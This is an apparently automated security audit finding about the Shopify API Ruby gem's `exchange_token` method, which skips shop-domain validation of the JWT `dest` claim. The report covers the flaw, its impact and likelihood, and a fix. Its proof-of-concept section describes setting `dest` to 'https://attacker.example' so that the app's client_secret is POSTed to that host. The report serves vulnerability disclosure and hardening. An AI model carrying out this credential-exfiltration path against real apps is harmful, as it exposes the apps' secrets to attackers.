Found: `TokenExchange.exchange_token` uses the JWT session token's `dest` claim as the shop, but unlike every other credential-issuing path in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`, all of which call `Utils::ShopValidator.sanitize!`), `exchange_token` never validates `dest_shop` against `ShopValidator`.

### Title
Unsanitized `dest` claim used as SSRF host target in `TokenExchange.exchange_token` - ([File: lib/shopify_api/auth/token_exchange.rb])

### Summary
`TokenExchange.exchange_token` decodes the session (id) token and takes the `shop` (i.e. `dest` claim, with `https://` stripped) directly as the destination host for the outbound token-exchange HTTP request that carries the app's `client_id`/`client_secret`, without ever passing it through `Utils::ShopValidator.sanitize!`.

### Finding Description
In `exchange_token`, the shop used to build the outbound request is taken straight from the JWT payload: [1](#0-0) 
This `dest_shop` is fed directly into `ShopifyAPI::Auth::Session.new(shop: dest_shop)`, which is then used by `Clients::HttpClient` to build `@base_uri = "https://#{session.shop}"` and issue the POST containing `client_secret` in the body: [2](#0-1) 

`JwtPayload` only verifies the HMAC signature and that `aud == Context.api_key`; it performs no allow-listing of the `dest`/`iss` host: [3](#0-2) 

By contrast, every sibling credential-exchange method in the same module — `migrate_to_expiring_token`, `ClientCredentials.client_credentials`, and `RefreshToken.refresh_access_token` — explicitly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the session used for the outbound request: [4](#0-3) [5](#0-4) [6](#0-5) 
`ShopValidator.sanitize!` restricts hosts to the trusted domain list (`shopify.com`, `myshopify.com`, `myshopify.io`, `spin.dev`, `shop.dev`): [7](#0-6) 

The binding that should hold is: `host that receives client_secret == a ShopValidator-trusted Shopify domain`. In `exchange_token` this equality is never enforced — the host is only constrained by "whatever string a validly-HMAC-signed session token's `dest` claim contains." Since embedded apps typically source the session token from the client-side (`Authorization` header/App Bridge, e.g. via `SessionUtils.current_session_id`), and `JwtPayload` does not tie `dest` to a validated shop domain, a token whose `dest` claim contains an attacker-controlled or malformed host causes `HttpClient` to send the token-exchange body (containing `client_id` and `client_secret`, i.e. the app's `client_secret`) to that attacker-influenced host.

### Impact Explanation
This is SSRF carrying the app's credentials (`client_secret`) to an unvalidated host — matching the High-impact category "SSRF with the app's credentials." If exploitable end-to-end (dependent on how the host application obtains/vets the session token before calling `exchange_token`), it could leak the app's `client_secret` to an attacker-controlled endpoint.

### Likelihood Explanation
Moderate/uncertain. Exploitability strictly depends on the JWT's HMAC signature check passing, which requires the token to be a genuine Shopify-issued session token (or one forged with `api_secret_key`, which is out of scope here). In legitimate Shopify-issued tokens, `dest` is normally a real shop domain set by Shopify. However, the gem itself performs no defense-in-depth check on that value before using it as an outbound host — unlike its sibling methods — so the security guarantee for `exchange_token` relies entirely on trusting the token issuer's claim content rather than the gem's own validation, which is an inconsistency in the trust boundary compared to `migrate_to_expiring_token`/`refresh_access_token`/`client_credentials`.

### Recommendation
Call `Utils::ShopValidator.sanitize!(dest_shop)` on the `dest` claim in `TokenExchange.exchange_token` (as is already done in `migrate_to_expiring_token`, `refresh_access_token`, and `client_credentials`) before using it to construct `shop_session`, raising `Errors::InvalidShopError` for any non-trusted domain.

### Proof of Concept
1. Obtain (or have the host app forward) a session/id token whose payload is signed correctly (via `Context.api_secret_key`) but whose `dest` claim is set to an attacker-controlled/non-Shopify host, e.g. `dest: "https://attacker.example"`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new(token)` succeeds (only checks HMAC + `aud`), setting `shop` to `attacker.example`.
4. `Clients::HttpClient.new(session: Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` builds `@base_uri = "https://attacker.example"`.
5. The gem POSTs `{client_id, client_secret, grant_type, subject_token, ...}` to `https://attacker.example/admin/oauth/access_token`, exfiltrating the app's `client_secret` to the attacker's host. [8](#0-7)
